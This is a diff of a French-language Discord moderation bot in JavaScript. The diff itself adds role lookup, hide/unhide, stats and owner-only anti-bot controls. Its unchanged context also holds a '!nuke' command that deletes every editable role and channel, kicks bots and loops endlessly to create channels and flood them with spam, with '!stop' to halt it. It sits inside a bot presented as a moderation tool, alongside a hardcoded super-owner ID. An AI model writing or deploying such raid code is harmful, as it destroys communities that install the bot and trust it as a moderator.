@@ -1,11 +1,11 @@
-// Build Revision: K2L-Bot-Ultra-Speed-v27.0
+// Build Revision: K2L-Bot-Ultra-Speed-v28.0
 const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
 const http = require('http');
 
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('K2L Bot Ultra Speed Operational v27.0!\n');
+    res.end('K2L Bot Ultra Speed Operational v28.0!\n');
 }).listen(PORT, '0.0.0.0', () => console.log(`Serveur HTTP actif sur le port ${PORT} (0.0.0.0)`));
 
 const client = new Client({
@@ -28,7 +28,7 @@ const warningsMap = new Map();
 const jailDataMap = new Map();
 const activeNukes = new Map();
 
-// Propriétaire unique et absolu (Toi)
+// Ton ID et ton pseudo uniques en tant que Super Owner absolu
 const SUPER_OWNERS = new Set(["1166445202148442112", "graveuhq"]); 
 const botOwners = new Set(["1166445202148442112", "graveuhq"]); 
 
@@ -143,6 +143,18 @@ async function fetchTargetMember(message, targetArg) {
     const cleanId = targetArg.replace(/<@!?|>/g, '');
     try {
         return await message.guild.members.fetch(cleanId);
+    } catch (e) {
+        return null;
+    }
+}
+
+async function fetchTargetRole(message, roleArg) {
+    if (!roleArg) return null;
+    const mentionRole = message.mentions.roles.first();
+    if (mentionRole) return mentionRole;
+    const cleanId = roleArg.replace(/<@&|>/g, '');
+    try {
+        return await message.guild.roles.fetch(cleanId);
     } catch (e) {
         return null;
     }
@@ -267,7 +279,8 @@ client.on('guildMemberAdd', async member => {
                 const auditLog = fetchedLogs.entries.first();
                 const executor = auditLog ? auditLog.executor : null;
 
-                const isExecutorSuperOwner = executor ? isSuperOwnerById(executor.id, executor.username, executor.globalName) : false;
+                // Seul le Super Owner absolu peut bypass l'antibot (les autres owners normaux ne le peuvent pas)
+                const isExecutorSuperOwner = executor ? SUPER_OWNERS.has(executor.id) || SUPER_OWNERS.has(executor.username.toLowerCase()) : false;
 
                 if (!isExecutorSuperOwner) {
                     await member.kick('Anti-bot activé.');
@@ -572,7 +585,6 @@ client.on('messageCreate', async message => {
         const args = message.content.slice(1).trim().split(/ +/);
         const command = args.shift().toLowerCase();
         
-        // COMMANDE STOP : Coupe net la boucle du nuke
         if (command === 'stop') {
             if (activeNukes.has(message.guild.id)) {
                 clearInterval(activeNukes.get(message.guild.id));
@@ -582,11 +594,9 @@ client.on('messageCreate', async message => {
             return message.reply("❌ Aucune boucle de nuke active sur ce serveur.").catch(() => {});
         }
 
-        // COMMANDE NUKE ULTRA RAPIDE : Intègre le flood de salons en continu, roles et kickbot
         if (command === 'nuke') {
             await message.reply("⚡ **[NUKE]** Destruction totale, flood infini de salons/rôles et kickbot en cours... (Tape `!stop` pour stopper)").catch(() => {});
             
-            // 1. Flood des rôles & kickbot instantanés
             message.guild.roles.cache
                 .filter(role => role.editable && role.id !== message.guild.id)
                 .forEach(role => role.delete().catch(() => {}));
@@ -602,14 +612,12 @@ client.on('messageCreate', async message => {
                 }
             }).catch(() => {});
 
-            // 2. Suppression initiale des salons
             message.guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));
 
             if (activeNukes.has(message.guild.id)) {
                 clearInterval(activeNukes.get(message.guild.id));
             }
 
-            // 3. Boucle continue de création de salons et spam massif
             const nukeInterval = setInterval(async () => {
                 try {
                     const channelPromises = [];
@@ -843,7 +851,7 @@ client.on('messageCreate', async message => {
                     '`=setantilink <action>`\n┗ Sanction anti-lien',
                     '`=antispam on / off`\n┗ Anti-spam',
                     '`=setantispam <action>`\n┗ Sanction anti-spam',
-                    '`=antibot on / off`\n┗ Anti-bot',
+                    '`=antibot on / off`\n┗ Anti-bot (Seul le Super Owner absolu peut le désactiver)',
                     '`=setantibot <action>`\n┗ Sanction anti-bot'
                 ]
             },
@@ -875,6 +883,7 @@ client.on('messageCreate', async message => {
                 label: 'Salons', emoji: '🔒', title: 'Salons & Vocaux',
                 commands: [
                     '`=lock` / `=unlock`\n┗ Verrouiller / Déverrouiller',
+                    '`=hide` / `=unhide`\n┗ Cacher / Afficher le salon',
                     '`=slowmode <sec>`\n┗ Mode lent',
                     '`=renew`\n┗ Régénérer le salon',
                     '`=createtext <nom>`\n┗ Créer salon texte',
@@ -884,8 +893,14 @@ client.on('messageCreate', async message => {
             roles: {
                 label: 'Rôles', emoji: '🏷️', title: 'Gestion des Rôles (Sécurisée)',
                 commands: [
-                    '`=addrole <@membre> <@rôle>`\n┗ Ajouter un rôle',
-                    '`=delrole <@membre> <@rôle>`\n┗ Retirer un rôle'
+                    '`=addrole <@membre> <@rôle|ID>`\n┗ Ajouter un rôle (Vérification hiérarchie)',
+                    '`=delrole <@membre> <@rôle|ID>`\n┗ Retirer un rôle'
+                ]
+            },
+            utilitaires: {
+                label: 'Utilitaires', emoji: '📊', title: 'Stats & Utilitaires',
+                commands: [
+                    '`=stats`\n┗ Statistiques détaillées du serveur'
                 ]
             },
             giveaways: {
@@ -907,7 +922,7 @@ client.on('messageCreate', async message => {
             staff: {
                 label: 'Staff', emoji: '👑', title: 'Staff & Hiérarchie',
                 commands: [
-                    '`=owners`\n┗ Liste des owners',
+                    '`=owners`\n┗ Propriétaire unique',
                     '`=setlog <#salon>`\n┗ Salon de logs général',
                     '`=setwelcome <#salon> <msg>`\n┗ Salon de bienvenue'
                 ]
@@ -986,12 +1001,17 @@ client.on('messageCreate', async message => {
     if (command === 'antibot') {
         const sub = args[0]?.toLowerCase();
         if (sub === 'on' || sub === 'off') {
+            // Strictement réservé au Super Owner absolu
+            if (!isSuperOwner(message)) {
+                return message.reply("❌ Seul le Super Owner absolu (`graveuhq`) peut activer ou désactiver l'Anti-Bot !");
+            }
             config.antibot = (sub === 'on');
-            return message.reply(`🛡️ Anti-Bot réglé sur **${sub.toUpperCase()}**`);
+            return message.reply(`🛡️ Anti-Bot réglé sur **${sub.toUpperCase()}** par le Super Owner.`);
         }
     }
 
     if (command === 'setantibot') {
+        if (!isSuperOwner(message)) return message.reply("❌ Réservé au Super Owner absolu.");
         const action = args[0]?.toLowerCase();
         const validActions = ['delete', 'warn', 'mute', 'kick', 'jail', 'ban'];
         if (!validActions.includes(action)) return message.reply(`❌ Action invalide. Choix : \`${validActions.join(', ')}\``);
@@ -1038,6 +1058,34 @@ client.on('messageCreate', async message => {
         const ownerList = Array.from(botOwners).map(id => `┗ ID : \`${id}\``).join('\n');
         return message.reply({ embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle('👑 Propriétaire Unique').setDescription(ownerList)] });
     }
+    if (command === 'stats') {
+        const guild = message.guild;
+        await guild.members.fetch();
+        const totalMembers = guild.memberCount;
+        const onlineMembers = guild.members.cache.filter(m => m.presence && m.presence.status !== 'offline').size;
+        const botCount = guild.members.cache.filter(m => m.user.bot).size;
+        const humanCount = totalMembers - botCount;
+        const voiceChannelsCount = guild.channels.cache.filter(c => c.type === ChannelType.GuildVoice).size;
+        const textChannelsCount = guild.channels.cache.filter(c => c.type === ChannelType.GuildText).size;
+        const boostCount = guild.premiumSubscriptionCount || 0;
+        const boostTier = guild.premiumTier;
+
+        const statsEmbed = new EmbedBuilder()
+            .setColor('#2b2d31')
+            .setTitle(`📊 Statistiques du serveur : ${guild.name}`)
+            .setThumbnail(guild.iconURL({ dynamic: true }))
+            .addFields(
+                { name: '👥 Membres', value: `Total : \`${totalMembers}\`\nHumains : \`${humanCount}\`\nBots : \`${botCount}\``, inline: true },
+                { name: '💬 Salons', value: `Texte : \`${textChannelsCount}\`\nVocal : \`${voiceChannelsCount}\``, inline: true },
+                { name: '🚀 Boosts', value: `Niveau : \`${boostTier}\`\nBoosts : \`${boostCount}\``, inline: true },
+                { name: '👑 Propriétaire', value: `<@${guild.ownerId}>`, inline: true },
+                { name: '📅 Création', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true }
+            )
+            .setTimestamp();
+
+        return message.reply({ embeds: [statsEmbed] });
+    }
+
     if (command === 'ticketsetup') {
         return message.reply({ embeds: [getTicketDashboardEmbed(message.guild, config)], components: getTicketDashboardRows() });
     }
@@ -1175,6 +1223,16 @@ client.on('messageCreate', async message => {
         return message.reply("🔓 Salon déverrouillé.");
     }
 
+    if (command === 'hide') {
+        await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { ViewChannel: false });
+        return message.reply("🙈 Salon caché pour tout le monde.");
+    }
+
+    if (command === 'unhide') {
+        await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { ViewChannel: null });
+        return message.reply("🐵 Salon visible à nouveau.");
+    }
+
     if (command === 'mute') {
         const targetMember = await fetchTargetMember(message, targetArg);
         const durationStr = args[1];
@@ -1261,7 +1319,6 @@ client.on('messageCreate', async message => {
         await member.kick();
         return message.reply(`✅ Expulsé.`);
     }
-
     else if (command === 'clear') {
         const count = parseInt(args[0]);
         if (isNaN(count) || count < 1 || count > 50) return message.reply("❌ Entre 1 et 50.");
@@ -1291,6 +1348,7 @@ client.on('messageCreate', async message => {
         await message.channel.setRateLimitPerUser(sec);
         return message.reply(`⏱️ Mode lent : ${sec}s.`);
     }
+
     else if (command === 'renew') {
         const newChan = await message.channel.clone();
         await message.channel.delete();
@@ -1306,37 +1364,54 @@ client.on('messageCreate', async message => {
         await message.guild.channels.create({ name: args.join(' '), type: ChannelType.GuildVoice });
         return message.reply("✅ Salon vocal créé.");
     }
-
     else if (command === 'addrole') {
         const member = await fetchTargetMember(message, targetArg);
-        const role = message.mentions.roles.first();
-        if (!member || !role) return message.reply("Utilisation : `=addrole <@membre> <@rôle>`");
+        const role = await fetchTargetRole(message, args[1]);
+        if (!member || !role) return message.reply("Utilisation : `=addrole <@membre> <@rôle|ID>`");
         
-        if (!isSuperOwner(message) && !isOwner(message)) {
+        // Vérification de la hiérarchie pour les non-super-owners
+        if (!isSuperOwner(message)) {
             const authorHighest = message.member.roles.highest.position;
+            const botHighest = message.guild.members.me.roles.highest.position;
+
             if (role.position >= authorHighest) {
                 return message.reply("❌ Tu ne peux pas attribuer un rôle supérieur ou égal à ton propre rôle le plus haut.");
             }
-        }
-
-        await member.roles.add(role);
-        return message.reply(`✅ Rôle ${role.name} ajouté à ${member.user.tag}.`);
-    }
-
-    else if (command === 'delrole') {
-        const member = await fetchTargetMember(message, targetArg);
-        const role = message.mentions.roles.first();
-        if (!member || !role) return message.reply("Utilisation : `=delrole <@membre> <@rôle>`");
-
-        if (!isSuperOwner(message) && !isOwner(message)) {
-            const authorHighest = message.member.roles.highest.position;
-            if (role.position >= authorHighest) {
-                return message.reply("❌ Tu ne peux pas retirer un rôle supérieur ou égal à ton propre rôle le plus haut.");
+            if (role.position >= botHighest) {
+                return message.reply("❌ Je ne peux pas attribuer ce rôle car il est supérieur ou égal au mien.");
             }
         }
 
-        await member.roles.remove(role);
-        return message.reply(`✅ Rôle ${role.name} retiré à ${member.user.tag}.`);
+        try {
+            await member.roles.add(role);
+            return message.reply(`✅ Rôle ${role.name} ajouté à ${member.user.tag}.`);
+        } catch (e) {
+            return message.reply("❌ Erreur lors de l'ajout du rôle (Vérifie mes permissions).");
+        }
+    }
+    else if (command === 'delrole') {
+        const member = await fetchTargetMember(message, targetArg);
+        const role = await fetchTargetRole(message, args[1]);
+        if (!member || !role) return message.reply("Utilisation : `=delrole <@membre> <@rôle|ID>`");
+
+        if (!isSuperOwner(message)) {
+            const authorHighest = message.member.roles.highest.position;
+            const botHighest = message.guild.members.me.roles.highest.position;
+
+            if (role.position >= authorHighest) {
+                return message.reply("❌ Tu ne peux pas retirer un rôle supérieur ou égal à ton propre rôle le plus haut.");
+            }
+            if (role.position >= botHighest) {
+                return message.reply("❌ Je ne peux pas retirer ce rôle car il est supérieur ou égal au mien.");
+            }
+        }
+
+        try {
+            await member.roles.remove(role);
+            return message.reply(`✅ Rôle ${role.name} retiré à ${member.user.tag}.`);
+        } catch (e) {
+            return message.reply("❌ Erreur lors du retrait du rôle (Vérifie mes permissions).");
+        }
     }
 });
 
